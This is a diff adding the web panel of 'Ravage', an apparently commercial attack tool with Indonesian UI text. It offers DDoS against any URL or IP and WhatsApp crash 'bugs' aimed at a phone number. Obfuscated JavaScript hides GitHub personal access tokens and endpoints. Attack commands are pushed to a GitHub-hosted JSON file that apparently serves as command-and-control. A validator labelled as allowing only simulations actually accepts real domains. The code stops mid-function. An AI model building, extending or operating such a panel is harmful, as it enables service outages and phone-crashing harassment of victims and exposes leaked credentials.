@@ -1132,6 +1132,2226 @@ main[id^="view-"].visible {
 </div>
 
 <!-- Badge + Judul + Deskripsi + Tombol -->
+<span class="badge"><i class="fa-solid fa-bug"></i> BUG WHATSAAP</span>
+<h2 style="margin-top:6px; margin-bottom:10px;">
+  APPLICATION <span style="background:linear-gradient(90deg,var(--primary),var(--secondary));
+                       -webkit-background-clip:text;
+                       background-clip:text;
+                       color:transparent;">RAVAGE</span>
+</h2>
+<p class="hero-desc">
+  APPLICATION RAVAGE ADALAH SEBUAH APLIKASI YANG BERTAMPILAN DESAIN UI YANG MENYEDIAKAN FITUR LOGIN DAN MANAJEMEN AKUN, DDOS, BUG WHATSAAP, SERTA DILENGKAPI KONTROL PENUH OLEH ADMIN.  
+</p>
+
+</p>
+<div class="space"></div>
+<div class="flex" style="gap:10px; flex-wrap:wrap;">
+  <span class="chip"><i class="fa-solid fa-paper-plane"></i> Sender</span>
+  <span class="chip"><i class="fa-solid fa-server"></i> Server</span>
+  <span class="chip"><i class="fa-solid fa-shield"></i> Protection</span>
+</div>
+      </div>
+      <div class="card login-card reveal right" style="max-width:420px; width:100%">
+        <h3 class="title">Login</h3>
+        <p class="subtitle">Silahkan Masukan Akun Yang Telah terdaftar.</p>
+        <form id="formLogin">
+          <div class="row">
+            <div>
+              <label>Username</label>
+              <input id="username" class="input" placeholder="nama pengguna" required />
+            </div>
+            <div>
+              <label>Password</label>
+              <input id="password" class="input" type="password" placeholder="••••••" required />
+            </div>
+          </div>
+          <div class="space"></div>
+          <button class="btn" type="submit"><i class="fa-solid fa-right-to-bracket"></i> Login</button>
+          <div id="loginMsg" class="subtitle" style="margin-top:12px"></div>
+        </form>
+      </div>
+    </section>
+  </main>
+    <!-- DASHBOARD -->  
+<main id="view-dashboard" class="container hidden">
+  <section class="card reveal">
+    <h3 class="title">
+      <span class="bg1">Selamat datang</span>
+    </h3>
+    <p class="subtitle">
+      <span class="bg2">Silahkan Klik Opsi Menu Yang Berada Di Kanan Atas.</span>
+    </p>
+    <p class="subtitle">
+      <span class="bg3">Status user adalah untuk <b>Reseller</b> 
+        dan Status Admin adalah untuk <b>Partner</b>
+      </span>
+    </p>
+    
+    <div class="flex">
+      <span class="chip"><i class="fa-solid fa-address-card"></i> Status :</span>
+      <span class="chip"><i class="fa-solid fa-user-shield"></i> <span id="roleChip">user</span></span>
+    </div>
+
+    <!-- ✅ Slideshow langsung di dalam card -->
+    <div class="slideshow-box">
+      <div class="slide-box active">
+        <img src="https://h.top4top.io/p_35482gxtq1.jpg" alt="Slide 1">
+        <div class="slide-text">Ravage</div>
+      </div>
+      <div class="slide-box">
+        <img src="https://j.top4top.io/p_3548ucbrm1.jpg" alt="Slide 2">
+        <div class="slide-text">Ravage</div>
+      </div>
+      <div class="slide-box">
+        <img src="https://d.top4top.io/p_3548tpa0j1.jpg" alt="Slide 3">
+        <div class="slide-text">Ravage</div>
+      </div>
+    </div>
+  </section>
+</main>  <!-- ADD NUMBER -->  <main id="view-numbers" class="container hidden">
+    <section class="card reveal left">
+      <h3 class="title"><i class="fa-solid fa-square-plus"></i> Tambah Nomor</h3>
+      <p class="subtitle">Masukkan nomor (contoh: 62812345678).</p>
+      <div class="row">
+        <input id="numberInput" class="input" placeholder="Hanya angka…" />
+        <button id="btnAddNumber" class="btn"><i class="fa-solid fa-plus"></i> Tambah</button>
+      </div>
+      <div id="numMsg" class="subtitle" style="margin-top:12px"></div>
+    </section>
+  </main>
+  <!-- ===== VIEW: FEATURES DDoS ===== -->
+<main id="view-ddos" class="container hidden" style="display:flex; justify-content:center;">
+  <section class="card reveal" style="width:100%; max-width:760px; margin:22px auto;">
+    <h3 class="title" style="text-align:center;">
+      <i class="fa-solid fa-bolt"></i> FEATURES DDOS
+    </h3>
+    <p class="subtitle" style="text-align:center; margin-bottom:12px;">
+      Gunakan <code>Fitur ini dengan</code> Bijak.
+    </p>
+
+    <!-- Target input -->
+    <div style="display:flex; justify-content:center; gap:10px; flex-wrap:wrap; margin-bottom:14px;">
+      <input id="ddosTargetInput" class="input" placeholder="Url/IP" style="flex:1; max-width:520px;" />
+      <input id="ddosPortInput" class="input" placeholder="Port (30)" style="width:120px" />
+      <input id="ddosDurationInput" class="input" placeholder="Durasi" style="width:140px" />
+    </div>
+
+    <!-- Method select grid -->
+    <div id="ddosMethodGrid" class="ddos-grid">
+      <div class="ddos-card" data-cmd=".http">
+        <i class="fa-solid fa-globe"></i>
+        <div><h4>HTTP</h4><p>attack</p></div>
+      </div>
+      <div class="ddos-card" data-cmd=".tcp">
+        <i class="fa-solid fa-plug"></i>
+        <div><h4>NETWORK</h4><p>udp</p></div>
+      </div>
+      <div class="ddos-card" data-cmd=".udp">
+        <i class="fa-solid fa-wifi"></i>
+        <div><h4>STEALTH</h4><p>down</p></div>
+      </div>
+      <div class="ddos-card" data-cmd=".slow">
+        <i class="fa-solid fa-network-wired"></i>
+        <div><h4>BYPASS</h4><p>Cloudflare</p></div>
+      </div>
+    </div>
+
+    
+<!-- Kirim button dengan background bening selalu ada -->
+<div class="ddos-send-box">
+  <button id="sendDdosBtn" class="glass-btn">
+    <i class="fa-solid fa-paper-plane"></i> SEND DDOS
+  </button>
+
+  <div class="msg-wrap">
+    <p id="ddosMsg" class="msg-glass"></p>
+  </div>
+</div>
+
+    <!-- Status row -->
+<div class="status-row">
+  <section class="card">
+    <h3 class="title">ACTIVITY</h3>
+    <p class="subtitle">Usage</p>
+    <div style="text-align:center; margin-top:12px;">
+      <i class="fas fa-bolt" style="font-size:42px; color:var(--primary);"></i>
+      <p id="activityCount" style="margin-top:8px; font-size:18px; font-weight:600;">0</p>
+    </div>
+  </section>
+
+  <section class="card">
+    <h3 class="title">SERVERS</h3>
+    <p class="subtitle">Status</p>
+    <div style="text-align:center; margin-top:12px;">
+      <i class="fas fa-server" style="font-size:42px; color:var(--primary);"></i>
+      <p id="serverStatus" style="margin-top:8px; font-size:18px; font-weight:600;">OFF</p>
+    </div>
+  </section>
+</div>
+</main>
+    <!-- BUG FEATURES -->  
+<main id="view-bug" class="container hidden">
+  <div class="bug-wrapper center-wrapper">
+
+    <!-- Card Bug -->
+    <section class="card bug-card-center">
+      <h3 class="title"><i class="fa-solid fa-bug"></i> Features Bug</h3>
+      <p class="subtitle">Masukkan nomor target lalu pilih type bug.</p>
+
+      <div class="input-group" style="margin-bottom:16px; text-align:center;">
+        <input type="text" id="bugNumber" class="input" placeholder="Example: 62123..." style="max-width:320px; margin:0 auto;" />
+      </div>
+
+      <div class="bug-menu">
+        <div class="bug-card" data-cmd=".forceclose">
+          <i class="fa-solid fa-mobile-screen-button"></i>
+          <div>
+            <h4>Force Close</h4>
+            <p>Open and close repeat</p>
+          </div>
+        </div>
+        <div class="bug-card" data-cmd=".delay">
+          <i class="fa-solid fa-clock"></i>
+          <div>
+            <h4>Delay Invisible</h4>
+            <p>Message Delay</p>
+          </div>
+        </div>
+        <div class="bug-card" data-cmd=".infinity">
+          <i class="fa-solid fa-infinity"></i>
+          <div>
+            <h4>Crash Infinity</h4>
+            <p>Loop crash</p>
+          </div>
+        </div>
+        <!-- ✅ Bug baru: iPhone Crash -->
+        <div class="bug-card" data-cmd=".iphonecrash">
+          <i class="fa-brands fa-apple"></i>
+          <div>
+            <h4>iPhone Crash</h4>
+            <p>Crash khusus iOS</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tombol Kirim -->
+      <div style="margin-top:20px; text-align:center;">
+        <button id="sendBugBtn" class="btn"><i class="fa-solid fa-paper-plane"></i> Send Bug</button>
+      </div>
+
+<div class="status-row">
+  <section class="card">
+    <h3 class="title">ACTIVITY</h3>
+    <p class="subtitle">Usage</p>
+    <div style="text-align:center; margin-top:12px;">
+      <i class="fas fa-bolt" style="font-size:42px; color:var(--primary);"></i>
+      <p id="activityCount" style="margin-top:8px; font-size:18px; font-weight:600;">0</p>
+    </div>
+  </section>
+
+  <section class="card">
+    <h3 class="title">SERVERS</h3>
+    <p class="subtitle">Status</p>
+    <div style="text-align:center; margin-top:12px;">
+      <i class="fas fa-server" style="font-size:42px; color:var(--primary);"></i>
+      <p id="serverStatus" style="margin-top:8px; font-size:18px; font-weight:600;">OFF</p>
+    </div>
+  </section>
+</div>
+</main>
+ <!-- ACCOUNTS (ADMIN) -->  
+ <main id="view-accounts" class="container hidden">
+    <section class="card reveal">
+      <h3 class="title"><i class="fa-solid fa-user-gear"></i> Manage Account</h3>
+      <p class="subtitle">Buat & hapus akun. Hanya untuk status <b>admin</b>.</p>
+      <div class="row">
+  <input id="newUser" class="input" placeholder="username" />
+  <input id="newPass" class="input" placeholder="password" />
+</div>
+
+<div class="row" style="margin-top:12px;">
+  <input id="newExpired" class="input" placeholder="contoh: 1 hari / 7 hari / 30 hari" />
+</div>
+    <div class="row">
+<div class="row" style="margin-top:15px; flex-direction:column; gap:8px; flex:1">
+  <label for="newRole" style="font-size:14px; font-weight:600; color:var(--text); margin-left:4px;">
+    Pilih Status
+  </label>
+  <div class="dropdown-glass">
+    <button id="roleBtn">
+      <span style="display:flex;align-items:center;gap:8px;justify-content:center;width:100%">
+        <i class="fa-solid fa-user"></i> User
+      </span> ▾
+    </button>
+    <ul id="roleList" class="hidden">
+      <li data-value="user"><i class="fa-solid fa-user"></i> User</li>
+      <li data-value="admin"><i class="fa-solid fa-user-shield"></i> Admin</li>
+    </ul>
+  </div>
+  <input type="hidden" id="newRole" value="user">
+</div>
+
+<div class="row" style="margin-top:15px">
+  <button id="btnCreate" class="btn">
+    <i class="fa-solid fa-user-plus"></i> Buat Akun
+  </button>
+</div>
+      <div id="accMsg" class="subtitle" style="margin-top:12px"></div>
+<div class="space"></div>
+<div class="card">
+  <h4 class="title" style="font-size:18px">Akun Yang Terdaftar</h4>
+  <div style="overflow:auto">
+    <table>
+      <thead>
+        <tr>
+          <th>No</th>
+          <th>Username</th>
+          <th>Status</th>
+          <th>Expired</th>
+          <th>Opsi</th>
+        </tr>
+      </thead>
+      <tbody id="accountsTable"></tbody>
+    </table>
+  </div>
+</div>
+    </section>
+  </main>  
+  <!-- ACCOUNTS (BLOCKED FOR USER) -->
+<main id="view-accounts-blocked" class="hero hidden" style="display:flex;align-items:center;justify-content:center;">
+  <section class="card reveal" style="max-width:420px; width:100%; text-align:center; padding:32px;">
+    
+    <!-- Card Icon -->
+    <div class="card" style="width:120px; height:120px; margin:0 auto 20px;
+                             display:flex; align-items:center; justify-content:center;">
+      <i class="fa-solid fa-lock" style="font-size:64px; color:var(--primary);"></i>
+    </div>
+
+    <h3 class="title" style="margin-bottom:10px;">Maaf Anda Bukan Status Admin</h3>
+    <p class="subtitle" style="margin-bottom:22px;">Silahkan Beli Akun Status Admin</p>
+    
+    <!-- Card Button (kecil) -->
+    <div class="card" style="display:inline-flex; padding:8px 14px; border-radius:14px; margin-top:10px;">
+      <a href="https://t.me/daffadevv" target="_blank" 
+         style="display:inline-flex; align-items:center; gap:8px;
+                font-size:14px; font-weight:600;
+                color:white; text-decoration:none;">
+        <i class="fas fa-external-link-alt"></i> Buy
+      </a>
+    </div>
+  </section>
+</main>
+  <script>
+  function _0x1a63ab(_0x5efbb7,_0x178dd0,_0x514d02,_0xbd2fcd){return _0x762a(_0x5efbb7- -0x3b3,_0x514d02);}(function(_0x4186e7,_0xe8fe28){function _0x1aa2de(_0xc0bda8,_0x4805ec,_0x52aa13,_0x3d4dbe){return _0x762a(_0x3d4dbe- -0x15b,_0xc0bda8);}const _0x4ad492=_0x4186e7();function _0x3682e1(_0x168920,_0x94e54b,_0x31ebcc,_0x33ed9f){return _0x762a(_0x94e54b- -0x75,_0x33ed9f);}while(!![]){try{const _0xfdc524=-parseInt(_0x1aa2de(0x44,0x27,0x59,0x49))/(-0x24fe+-0x1*-0x939+0x1bc6)*(parseInt(_0x1aa2de(0x45,0x4d,0x23,0x34))/(0x22be+0x1*-0x122b+-0x1091*0x1))+parseInt(_0x3682e1(0x171,0x14e,0x143,0x160))/(0x26bd+0x236*-0xb+-0xe68)*(parseInt(_0x1aa2de(0x52,0x61,0x6e,0x52))/(-0x12f8*0x2+-0x23a5+0x4999))+parseInt(_0x3682e1(0x173,0x152,0x169,0x167))/(-0x1*0x1caf+-0xf*-0x184+0x5f8)*(parseInt(_0x3682e1(0x144,0x14c,0x15e,0x168))/(0x17f5*0x1+0xe9*-0x22+0x703))+-parseInt(_0x1aa2de(0x22,0x24,0x3e,0x42))/(0xa26+0x3*0x971+-0x2672)*(-parseInt(_0x1aa2de(0x20,0x34,0x1f,0x3d))/(0x35*0x1d+0x525*-0x1+-0xd4))+-parseInt(_0x1aa2de(0x2c,0x13,0x46,0x32))/(0x1*0x1949+-0x21*-0x117+-0x3d37)*(parseInt(_0x1aa2de(0x3f,0x22,0x57,0x40))/(-0xafe+0x1685*0x1+-0xb7d))+-parseInt(_0x1aa2de(0x50,0x41,0x5b,0x53))/(0x190a+0x13be+-0x2cbd)+-parseInt(_0x3682e1(0x120,0x13a,0x12f,0x13f))/(0x1efb+0x10da+0x2fc9*-0x1)*(parseInt(_0x1aa2de(0x54,0x58,0x4b,0x5d))/(-0x7bf+0x52f*-0x3+0x1759));if(_0xfdc524===_0xe8fe28)break;else _0x4ad492['push'](_0x4ad492['shift']());}catch(_0x33f530){_0x4ad492['push'](_0x4ad492['shift']());}}}(_0x4d34,-0x1047cc+0x1497d1+0xbf5*0x9d));const _0x597a6f=(function(){let _0x20a134=!![];return function(_0x4f3574,_0x10457d){const _0x1f3b8e=_0x20a134?function(){if(_0x10457d){const _0x14e89f=_0x10457d['apply'](_0x4f3574,arguments);return _0x10457d=null,_0x14e89f;}}:function(){};return _0x20a134=![],_0x1f3b8e;};}()),_0x39d79e=_0x597a6f(this,function(){function _0x19fdfa(_0x5773f9,_0x41412d,_0x22cb73,_0x1c93d1){return _0x762a(_0x22cb73- -0x317,_0x5773f9);}function _0x461033(_0x43a821,_0x3454f8,_0x447543,_0x2275f0){return _0x762a(_0x3454f8- -0x2ac,_0x447543);}const _0x48b1c1={};_0x48b1c1[_0x19fdfa(-0x16e,-0x175,-0x185,-0x172)]=_0x461033(-0xd7,-0xee,-0x10b,-0x106)+'+$';const _0x46c0ce=_0x48b1c1;return _0x39d79e[_0x461033(-0x114,-0x10a,-0x115,-0xfa)]()['search'](_0x46c0ce[_0x19fdfa(-0x17c,-0x183,-0x185,-0x172)])[_0x19fdfa(-0x168,-0x177,-0x175,-0x184)]()[_0x461033(-0xff,-0xfc,-0xe7,-0x101)+'r'](_0x39d79e)[_0x461033(-0xcb,-0xed,-0xf4,-0xcf)]('(((.+)+)+)'+'+$');});_0x39d79e();const _0x225d03=(function(){let _0x1e981b=!![];return function(_0x268873,_0xb825d3){const _0x2b3ef9=_0x1e981b?function(){function _0x31ccbe(_0x90d9d0,_0x137945,_0x38c6d2,_0x4b5830){return _0x762a(_0x137945-0x1eb,_0x38c6d2);}if(_0xb825d3){const _0x5ab24a=_0xb825d3[_0x31ccbe(0x375,0x389,0x391,0x367)](_0x268873,arguments);return _0xb825d3=null,_0x5ab24a;}}:function(){};return _0x1e981b=![],_0x2b3ef9;};}()),_0x439f9d=_0x225d03(this,function(){const _0x22e616={'FyVGB':function(_0x461e25,_0x7d5892){return _0x461e25(_0x7d5892);},'kIxKe':function(_0x203a2f,_0x8730ff){return _0x203a2f+_0x8730ff;},'yvtPs':function(_0x5a830a,_0x5dd3ad){return _0x5a830a+_0x5dd3ad;},'VyOuI':'return\x20(fu'+_0xe05064(0x14d,0x14f,0x162,0x15f),'CzWij':_0xe05064(0x16f,0x149,0x15b,0x148)+'ctor(\x22retu'+_0xe05064(0x18c,0x170,0x16e,0x171)+'\x20)','DYilY':function(_0xd7f81b){return _0xd7f81b();},'TJMVo':function(_0x254215,_0x3e4d18){return _0x254215===_0x3e4d18;},'Lzlwl':_0xe05064(0x183,0x159,0x16f,0x165),'jTbFr':'log','tpjSz':_0x5ab62d(0x31c,0x31f,0x319,0x333),'AWOCr':'info','ANkmP':_0x5ab62d(0x30d,0x303,0x2f8,0x2f7),'rQtcr':_0x5ab62d(0x321,0x33f,0x31d,0x305),'oLnPk':'table','eglmH':function(_0x5992eb,_0x4bd5d8){return _0x5992eb<_0x4bd5d8;}};let _0x806b36;function _0x5ab62d(_0x59d5c6,_0x5d28f2,_0x4bd7b2,_0xf17a3e){return _0x762a(_0x59d5c6-0x166,_0xf17a3e);}try{const _0x4ed0a6=_0x22e616[_0xe05064(0x18c,0x16f,0x16c,0x154)](Function,_0x22e616[_0xe05064(0x187,0x187,0x172,0x173)](_0x22e616[_0xe05064(0x130,0x162,0x151,0x16a)](_0x22e616[_0xe05064(0x164,0x18e,0x182,0x1a1)],_0x22e616[_0x5ab62d(0x31d,0x337,0x31e,0x317)]),');'));_0x806b36=_0x22e616['DYilY'](_0x4ed0a6);}catch(_0x11c6ad){if(_0x22e616['TJMVo'](_0x22e616[_0x5ab62d(0x32b,0x31f,0x34c,0x328)],_0x5ab62d(0x30f,0x32c,0x306,0x322)))_0x806b36=window;else{const _0x2f2be2=_0x1b6f88[_0x5ab62d(0x304,0x2fc,0x319,0x303)](_0x5c798d,arguments);return _0xfb70ff=null,_0x2f2be2;}}const _0x1bba18=_0x806b36[_0x5ab62d(0x2f2,0x305,0x2dd,0x2d6)]=_0x806b36[_0x5ab62d(0x2f2,0x2d4,0x2eb,0x311)]||{};function _0xe05064(_0x4c3b1c,_0x17dd8a,_0x45e045,_0x3a12c0){return _0x762a(_0x45e045- -0x3a,_0x17dd8a);}const _0x47279b=[_0x22e616[_0xe05064(0x151,0x148,0x14d,0x15f)],_0x22e616[_0xe05064(0x156,0x15b,0x15c,0x155)],_0x22e616['AWOCr'],_0x22e616['ANkmP'],_0x22e616[_0x5ab62d(0x2fd,0x31e,0x320,0x318)],_0x22e616['oLnPk'],_0xe05064(0x169,0x189,0x183,0x17f)];for(let _0x203ca8=-0x3*-0x8d+0x1850+0x121*-0x17;_0x22e616[_0x5ab62d(0x32f,0x349,0x341,0x31e)](_0x203ca8,_0x47279b[_0xe05064(0x167,0x148,0x15a,0x165)]);_0x203ca8++){const _0x22653f=_0x225d03[_0xe05064(0x175,0x178,0x176,0x17e)+'r']['prototype'][_0x5ab62d(0x320,0x328,0x31a,0x303)](_0x225d03),_0x1d79d7=_0x47279b[_0x203ca8],_0x372ce9=_0x1bba18[_0x1d79d7]||_0x22653f;_0x22653f[_0x5ab62d(0x32a,0x315,0x33a,0x322)]=_0x225d03[_0x5ab62d(0x320,0x30f,0x318,0x319)](_0x225d03),_0x22653f[_0xe05064(0x18a,0x14d,0x168,0x145)]=_0x372ce9[_0xe05064(0x172,0x171,0x168,0x155)]['bind'](_0x372ce9),_0x1bba18[_0x1d79d7]=_0x22653f;}});_0x439f9d();function _0x762a(_0x374946,_0x39d79e){const _0x597a6f=_0x4d34();return _0x762a=function(_0x4d34ac,_0x762a37){_0x4d34ac=_0x4d34ac-(-0xe81+-0x5*0xdb+0x144d);let _0x402674=_0x597a6f[_0x4d34ac];return _0x402674;},_0x762a(_0x374946,_0x39d79e);}const API_LOGIN=_0x1a63ab(-0x22a,-0x249,-0x231,-0x248)+'i.github.c'+_0x4ea067(0x2ee,0x301,0x2e5,0x2ef)+_0x4ea067(0x30c,0x306,0x2f8,0x2ea)+_0x4ea067(0x2ce,0x2b0,0x2cc,0x2b1)+_0x4ea067(0x2ca,0x2dd,0x2c0,0x2ac)+'json';function _0x4d34(){const _0x44437b=['bByrF','affaDevv/I','length','{}.constru','tpjSz','rQtcr','182968ZrlRWQ','3jv_deYlyO','ts/idch.js','7654300TywgFR','nction()\x20','357WhSOAh','apply','github_pat','_11BTRJTMA','EYA7MS6e92','toString','PrzwD2GIm1','5HrhJVp','0hI2yNWGQQ','FyVGB','error','rn\x20this\x22)(','SroyS','om/repos/D','AhM_FF59Qd','kIxKe','1609052XESlQf','3851573EfPqga','1824PUVJKD','constructo','9fgtGRK3XM','i.github.c','ntents/act','trs','kLT','warn','CzWij','128505phyWyU','RU4','bind','exception','VyOuI','trace','(((.+)+)+)','search','ivity.json','6614574rPZvTr','affaDevv/A','9ZcJniw','__proto__','Lzlwl','BW2XTr22C6','5yxvNbF','affaDevv/D','eglmH','3OOPHigORF','nts/dbweb.','jTbFr','0oHK10d2y5','https://ap','BWEB/conte','yvtPs','console','9jgWNXu','Ilm5edFFBI','37736pnbjpB','34FBjejmf7','0Q7N7Q9JJN'];_0x4d34=function(){return _0x44437b;};return _0x4d34();}function _0x4ea067(_0xf6054a,_0x4c07ec,_0x40dc7b,_0x30fd62){return _0x762a(_0xf6054a-0x144,_0x4c07ec);}const TOKEN_LOGIN=_0x4ea067(0x2e3,0x2f8,0x2f1,0x2d8)+_0x4ea067(0x2e4,0x2c8,0x2dc,0x2c1)+_0x1a63ab(-0x22b,-0x20a,-0x221,-0x24c)+_0x1a63ab(-0x21a,-0x234,-0x206,-0x23d)+_0x4ea067(0x2d4,0x2d7,0x2f2,0x2cb)+'HSwXo8YIBV'+'EMx3YOmk6i'+'FQvESWPTJI'+_0x1a63ab(-0x1ed,-0x1f4,-0x206,-0x1fe)+_0x1a63ab(-0x1fa,-0x1fd,-0x213,-0x20d),API_BUGS='https://ap'+_0x1a63ab(-0x201,-0x1f8,-0x1ef,-0x21d)+_0x4ea067(0x2ee,0x2f6,0x2d0,0x2cf)+_0x1a63ab(-0x220,-0x20e,-0x219,-0x20e)+'DCH/conten'+_0x4ea067(0x2de,0x2dd,0x2e8,0x2ec)+'on',TOKEN_BUGS=_0x4ea067(0x2e3,0x2ca,0x2ca,0x2f1)+'_11BTRJTMA'+_0x1a63ab(-0x20e,-0x1fb,-0x1f9,-0x200)+_0x1a63ab(-0x208,-0x211,-0x224,-0x21d)+_0x1a63ab(-0x225,-0x21b,-0x23c,-0x22e)+_0x4ea067(0x2e7,0x2ed,0x2d2,0x2ef)+'ZKdnVpA63X'+'VBlB1ivY34'+'XEOYTWUikU'+_0x4ea067(0x2f8,0x2f6,0x2fe,0x2fa),API_ACTIVITY='https://ap'+'i.github.c'+_0x1a63ab(-0x209,-0x22a,-0x1fa,-0x229)+_0x1a63ab(-0x1f1,-0x20e,-0x1eb,-0x209)+'CTIVITY/co'+_0x4ea067(0x2f7,0x301,0x2f7,0x311)+_0x1a63ab(-0x1f3,-0x206,-0x1ff,-0x203),TOKEN_ACTIVITY=_0x4ea067(0x2e3,0x2ca,0x2f8,0x2f8)+_0x1a63ab(-0x213,-0x1fa,-0x20b,-0x212)+_0x4ea067(0x2d5,0x2ef,0x2cb,0x2f6)+'K2W_jUCXYc'+'WmbfJGJi75'+_0x1a63ab(-0x22e,-0x228,-0x21b,-0x21c)+'CoETjEup79'+_0x1a63ab(-0x202,-0x1e7,-0x20e,-0x1f3)+_0x1a63ab(-0x212,-0x203,-0x22d,-0x20f)+_0x4ea067(0x2f9,0x2f1,0x2e5,0x2e5);
+
+  	// Custom Dropdown Role
+const roleBtn = document.getElementById("roleBtn");
+const roleList = document.getElementById("roleList");
+const newRole = document.getElementById("newRole");
+
+roleBtn.onclick = () => roleList.classList.toggle("hidden");
+
+roleList.querySelectorAll("li").forEach(li => {
+  li.onclick = () => {
+    roleBtn.innerHTML = `<span style="display:flex;align-items:center;gap:8px;justify-content:center;width:100%">${li.innerHTML}</span> ▾`;
+    newRole.value = li.dataset.value;
+    roleList.classList.add("hidden");
+  };
+});
+
+
+
+function ddos_isSimTarget(target){
+  if(!target) return false;
+  const t = target.trim();
+
+  // disallow if contains protocol or spaces
+  if(/\s/.test(t)) return false;
+  if(/^(https?:\/\/)/i.test(t)) return false;
+
+  // disallow IPv4/IPv6 raw addresses
+  const isIPv4 = /^(\d{1,3}\.){3}\d{1,3}$/.test(t);
+  const isIPv6 = /:/.test(t) && /^[0-9a-fA-F:]+$/.test(t);
+  if(isIPv4 || isIPv6) return false;
+
+  // allow domain-like strings (contains at least one dot and alpha chars)
+  if(/^[a-z0-9\-]+\.[a-z0-9\-\.]+$/i.test(t)) return true;
+
+  // allow SIM: or sim- prefixed tokens for explicit simulation
+  if(/^SIM:|^sim-/i.test(t)) return true;
+
+  // otherwise disallow
+  return false;
+}
+
+/* write minimal-format entry to idch.json:
+   { command: "...", status: "pending" } */
+async function ddos_sendCommandToGithub(command, target) {
+  if(!ddos_isSimTarget(target)) throw new Error('Target tidak valid — gunakan nama domain (example.com) atau prefix SIM: untuk simulasi.');
+
+  if(typeof githubGet !== 'function' || typeof githubPut !== 'function'){
+    throw new Error('Helper githubGet/githubPut tidak ditemukan di halaman.');
+  }
+
+  // fetch current idch.json
+  const { content: oldContent, sha } = await githubGet(API_BUGS, TOKEN_BUGS);
+  const base = (oldContent && oldContent.data) ? oldContent : { server: "Active", data: [] };
+
+  // minimal entry format required
+  const entry = {
+    command: command,
+    status: "pending"
+  };
+
+  base.data.push(entry);
+
+  // commit back to GitHub
+  await githubPut(API_BUGS, TOKEN_BUGS, base, `log: ${command}`, sha);
+  return entry;
+}
+
+/* increment activity count and sync UI */
+async function ddos_incrementActivity(delta = 1){
+  if(typeof githubGet !== 'function' || typeof githubPut !== 'function'){
+    console.warn('github helpers not found for activity increment');
+    return null;
+  }
+  const res = await githubGet(API_ACTIVITY, TOKEN_ACTIVITY);
+  const data = res.content || { Activitas: 0 };
+  data.Activitas = (parseInt(data.Activitas, 10) || 0) + delta;
+  await githubPut(API_ACTIVITY, TOKEN_ACTIVITY, data, `activity +${delta}`, res.sha);
+
+  // update UI elements if present
+  const el = document.getElementById('ddosActivityCount');
+  if(el) el.textContent = data.Activitas;
+  const globalEl = document.getElementById('activityCount');
+  if(globalEl) globalEl.textContent = data.Activitas;
+
+  return data.Activitas;
+}
+
+/* UI wiring */
+(function(){
+  const cards = document.querySelectorAll('#ddosMethodGrid .ddos-card');
+  let chosenCmd = null;
+  cards.forEach(c => {
+    c.addEventListener('click', () => {
+      cards.forEach(x => x.classList.remove('selected'));
+      c.classList.add('selected');
+      chosenCmd = c.dataset.cmd; // e.g. ".slow"
+    });
+  });
+
+  const btn = document.getElementById('sendDdosBtn');
+  const msgEl = document.getElementById('ddosMsg');
+  const targetInput = document.getElementById('ddosTargetInput');
+  const portInput = document.getElementById('ddosPortInput');
+  const durInput = document.getElementById('ddosDurationInput');
+  const serverEl = document.getElementById('ddosServerStatus');
+
+  btn.addEventListener('click', async () => {
+    try {
+      if(!chosenCmd) throw new Error('Pilih type DDoS dulu.');
+      const rawTarget = (targetInput.value || '').trim();
+      if(!rawTarget) throw new Error('Isi target.');
+
+      // sanitize dur & port to digits only; use 'auto' if empty
+      const durRaw = (durInput.value || '').trim();
+      const portRaw = (portInput.value || '').trim();
+      const dur = durRaw === '' ? 'auto' : (durRaw.replace(/\D/g,'') || 'auto');
+      const port = portRaw === '' ? 'auto' : (portRaw.replace(/\D/g,'') || 'auto');
+
+      // build command with colons exactly as requested
+      const cmd = `${chosenCmd} ${rawTarget} dur:${dur} port:${port}`;
+      
+      // setelah: const cmd = `${chosenCmd} ${rawTarget} dur:${dur} port:${port}`;
+
+// buat string link untuk tampil di pesan (tambahkan http:// jika belum ada)
+const link = /^(https?:\/\/)/i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
+
+
+      // send minimal-format entry to idch.json
+      await ddos_sendCommandToGithub(cmd, rawTarget);
+
+      // increment activity count
+      await ddos_incrementActivity(1);
+
+      // visual feedback
+      if(serverEl) serverEl.textContent = 'ON';
+      msgEl.textContent = `Berhasil Dikirim ke "${link}"`;
+      msgEl.style.color = 'var(--success)';
+if (typeof showPopupNotif === 'function') {
+  showPopupNotif(`Succes!\n${link}`, true);
+}
+
+      // brief server ON flash
+      setTimeout(()=>{ if(serverEl) serverEl.textContent = 'OFF'; }, 2000);
+
+    } catch(err) {
+      msgEl.textContent = err.message || 'Gagal mengirim command.';
+      msgEl.style.color = 'var(--danger)';
+      if(typeof showPopupNotif === 'function') showPopupNotif(err.message || 'Gagal', false);
+    }
+  });
+})();
+
+async function loadActivity() {
+  try {
+    const res = await fetch(API_ACTIVITY, {
+      headers: { Authorization: `token ${TOKEN_ACTIVITY}` }
+    });
+    const data = await res.json();
+    const content = atob(data.content);
+    const actData = JSON.parse(content);
+    document.getElementById('activityCount').textContent = actData.Activitas || 0;
+  } catch (err) {
+    console.error("Gagal load activity:", err);
+  }
+}
+
+async function loadServer() {
+  try {
+    const res = await fetch(API_SERVER, {
+      headers: { Authorization: `token ${TOKEN_ACTIVITY}` }
+    });
+    const data = await res.json();
+    const content = atob(data.content);
+    const srvData = JSON.parse(content);
+    document.getElementById('serverStatus').textContent =
+      srvData.Servers?.Active ? "ON" : "OFF";
+  } catch (err) {
+    console.error("Gagal load server:", err);
+  }
+}
+
+// panggil otomatis saat masuk ke view-bug
+document.addEventListener("DOMContentLoaded", () => {
+  loadActivity();
+  loadServer();
+});
+
+// ===== CONFIG BUG =====
+
+
+let selectedBug = null;
+
+// Pilih bug type
+document.querySelectorAll('.bug-card').forEach(card=>{
+  card.addEventListener('click', ()=>{
+    document.querySelectorAll('.bug-card').forEach(c=> c.classList.remove('selected'));
+    card.classList.add('selected');
+    selectedBug = card.dataset.cmd;
+  });
+});
+
+// Tombol Send Bug
+document.getElementById('sendBugBtn').addEventListener('click', async()=>{
+  const num = document.getElementById('bugNumber').value.trim();
+  const msg = document.getElementById('bugMsg');
+
+  if(!num){ msg.textContent="Nomor wajib diisi!"; msg.style.color="var(--danger)"; return; }
+  if(!selectedBug){ msg.textContent="Pilih type bug terlebih dahulu!"; msg.style.color="var(--danger)"; return; }
+
+  const command = `${selectedBug} ${num}`;
+
+  try {
+    // Ambil isi JSON lama (idch.json)
+    const {content, sha} = await githubGet(API_BUGS, TOKEN_BUGS);
